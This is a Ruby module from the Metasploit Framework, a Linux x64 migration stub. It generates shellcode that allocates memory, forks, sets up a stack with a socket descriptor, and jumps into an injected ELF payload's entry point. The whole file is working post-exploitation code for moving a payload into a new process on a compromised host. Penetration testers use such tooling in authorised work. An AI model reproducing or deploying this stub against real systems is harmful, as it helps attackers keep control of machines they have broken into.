# -*- coding: binary -*-

require 'rex/elfparsey'
module Msf

###
#
# Payload that supports migration on x64.
#
###

module Payload::Linux::X64::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux Migration (x64)',
      'Description' => 'Migration stub x64',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64
    ))
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end
  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
    
    entry_offset = elf_ep(opts[:payload])
    
    asm = %^
      push rax
      push rcx
      push rdx
      push rbx
      push rsp
      push rbp
      push rdi
      push rsi
      push r9
      push r10
      push r11
      push r12
      push r13
      push r14
      push r15
      push 0x9
      pop rax
      xor rdi, rdi
      push #{opts[:payload_length]}
      pop rsi
      push 0x6
      pop rdx
      push 0x22
      pop r10
      xor r8,r8
      dec r8
      xor r9, r9
      syscall
      
      push rax
      pop r9
      int 3
      push 0x39
      pop rax
      syscall
      
      cmp rax, 0
      jz _exec_child
_exec_parent:
      pop r15
      pop r14
      pop r13
      pop r12
      pop r11
      pop r10
      pop r9
      pop rsi
      pop rdi
      pop rbp
      pop rsp
      pop rbx
      pop rdx
      pop rcx
      pop rax
      int 3
_exec_child:
      mov rax, 0x70
      syscall
      xchg rsi, r9
      push #{opts[:payload_length]}
      pop rdx
      and rsp, -0x10              ; Align
      add sp, 80                  ; Add room for initial stack and prog name
      mov rax, 109                ; prog name "m"
      push rax                    ;
      mov rcx, rsp                ; save the stack
      xor rbx, rbx
      push rbx                    ; NULL
      push rbx                    ; AT_NULL
      push rsi                    ; mmap'd address
      mov rax, 7                  ; AT_BASE
      push rax
      push rbx                    ; end of ENV
      push rbx                    ; NULL
      push rdi                    ; ARGV[1] int sockfd
      push rcx                    ; ARGV[0] char *prog_name
      mov rax, 2                  ; ARGC
      push rax

      ; down the rabbit hole
      mov rax, #{entry_offset}
      add rsi, rax
      jmp rsi
^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end

